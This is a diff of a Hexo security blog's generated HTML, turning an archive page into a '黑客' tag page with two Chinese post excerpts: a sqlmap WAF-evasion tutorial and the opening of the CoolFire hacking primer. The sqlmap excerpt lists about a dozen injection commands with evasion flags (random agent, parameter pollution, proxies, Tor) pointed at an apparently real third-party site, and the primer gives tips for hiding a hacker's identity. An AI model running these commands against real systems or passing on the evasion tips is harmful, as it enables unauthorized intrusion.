@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="攻VS防，战略与战术！马拉松式工作！">
-    <title>Archiv: 2018/7 - 攻VS防，战略与战术！马拉松式工作！</title>
+    <title>Tag: 黑客 - 攻VS防，战略与战术！马拉松式工作！</title>
     <meta name="author" content="Lao k17">
     
         <meta name="keywords" content="hexo,javascript,安全,">
@@ -20,7 +20,7 @@
 <meta name="keywords" content="hexo,javascript,安全">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="攻VS防，战略与战术！马拉松式工作！">
-<meta property="og:url" content="http://s-sec.github.io/archives/2018/07/index.html">
+<meta property="og:url" content="http://s-sec.github.io/tags/黑客/index.html">
 <meta property="og:site_name" content="攻VS防，战略与战术！马拉松式工作！">
 <meta property="og:description" content="记录网络安全,渗透渗透,信息安全,代码审计,权限提升,脚本漏洞,无线安全,社会工程,安全文献,安全媒体。">
 <meta property="og:locale" content="zh-CN">
@@ -241,49 +241,99 @@
     <section class="postShorten-group main-content-wrap">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
+    <article class="postShorten postShorten--thumbnailimg-right">
         <div class="postShorten-wrap">
             
             <div class="postShorten-header">
                 <h1 class="postShorten-title">
                     
-                        <a class="link-unstyled" href="/2018/07/14/hello-world/">
-                            Hello World
+                        <a class="link-unstyled" href="/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/">
+                            使用sqlmap 绕过防火墙进行注入测试
                         </a>
                     
                 </h1>
                 <div class="postShorten-meta">
-    <time datetime="2018-07-14T23:39:14+08:00">
+    <time datetime="2017-03-02T15:13:48+08:00">
 	
-		    14 7月 2018
+		    02 3月 2017
     	
     </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/安全技术/">安全技术</a>
+
+
     
 </div>
 
             </div>
             
-                <div class="postShorten-content">
-                    <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
+                <div class="postShorten-excerpt">
+                    <p><strong>PS</strong>: 内容摘自煜铭2011的博客<a href="http://blog.csdn.net/qq_29277155，仅供传阅学习！" target="_blank" rel="noopener">http://blog.csdn.net/qq_29277155，仅供传阅学习！</a><br>0x00 前言<br>   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。<br>0x01 确认WAF<br>     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;</a> –thread 10 –identify-waf#首选<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –thread 10  –check-waf#备选<br>0x02 使用参数进行绕过<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –delay=3.5 –time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –proxy=211.211.211.211:8080 –proxy-cred=211:985#使用代理进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –ignore-proxy#禁止使用系统的代理，直接连接进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –flush-session#清空会话，重构注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hex#或者使用参数 –no-cast ，进行字符码转换<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –mobile #对移动端的服务器进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –tor # 匿名注入<br>0x03 使用脚本介绍<br>
                     
+                        <a href="/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" class="postShorten-excerpt_link link">
+                            Weiterlesen
+                        </a>
                         
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-right">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title">
+                    
+                        <a class="link-unstyled" href="/2017/03/01/coolfire黑客入门教程/">
+                            coolfire黑客入门教程
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time datetime="2017-03-01T17:02:40+08:00">
+	
+		    01 3月 2017
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/安全技术/">安全技术</a>
 
+
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-excerpt">
+                    <p>CoolFire系列讲座 第1讲<br>作者:CoolFire [<a href="mailto:coolfires@hotmail.com" target="_blank" rel="noopener">coolfires@hotmail.com</a>] (2001-10-12 15:00:00)<br>CoolHC Volume 1   By CoolFire          Author E-Mail: <a href="mailto:coolfires@hotmail.com" target="_blank" rel="noopener">coolfires@hotmail.com</a></p>
+<p>这不是一个教学文件, 只是告诉你该如何破解系统, 好让你能够将自己的系统作安全的保护, 如果你能够将这份文件完全看完, 你就能够知道电脑骇客们是如何入侵你的电脑, 我是   CoolFire, 写这篇文章的目的是要让大家明白电脑安全的重要性, 并不是教人 Crack Password 若有人因此文件导致恶意入侵别人的电脑或网路, 本人概不负责 !!</p>
+<p>#1 甚么是 Hacking ?<br>    就是入侵电脑! 有甚么好解释的! 大部份有关介绍 Hacker 的书籍或小说及文件等都有清楚的介绍, 沉迷於电脑的人… 破坏… 唉! 一大堆怪解释就是了, 最好不要成为一个 “骇客”, 我… 不是!</p>
+<p>#2 为甚么要 Hack ?<br>    我们只是为了要   解更多关於系统的技术, 入侵它,了解它是如何运作的, 试试它的安全性, 然後学著去使用它, 读取系统中有关操作的说明, 学习它的各项操作 !! 为了安全性而作革命!</p>
+<p>#3 Hack 守则</p>
+<pre><code>1. 不恶意破坏任何的系统, 这样作只会给你带来麻烦.恶意破坏它人的软体将导致法律刑责, 如果你只是使用电脑, 那仅为非法使用!!   
+   注意: 千万不要破坏别人的软体或资料!!
+2. 不修改任何的系统档, 如果你是为了要进入系统而修改它, 请在答到目的後将它改回原状.
+3. 不要轻易的将你要 Hack 的站台告诉你不信任的朋友.
+4. 不要在 bbs 上谈论你 Hack 的任何事情.
+5. 在 Post 文章的时候不要使用真名.
+6. 正在入侵的时候, 不要随意离开你的电脑.
+7. 不要侵入或破坏政府机关的主机.
+8. 不在电话中谈论你 Hack 的任何事情.
+9. 将你的笔记放在安全的地方.
+</code></pre>
                     
-                    
-                        <p>
-                            <a href="/2018/07/14/hello-world/#post-footer" class="postShorten-excerpt_link link">
-                                Kommentieren und teilen
-                            </a>
-                        </p>
+                        <a href="/2017/03/01/coolfire黑客入门教程/" class="postShorten-excerpt_link link">
+                            Weiterlesen
+                        </a>
+                        
                     
                 </div>
             
@@ -300,7 +350,6 @@
 </div>
 
 </section>
-
 
 
                 <footer id="footer" class="main-content-wrap">
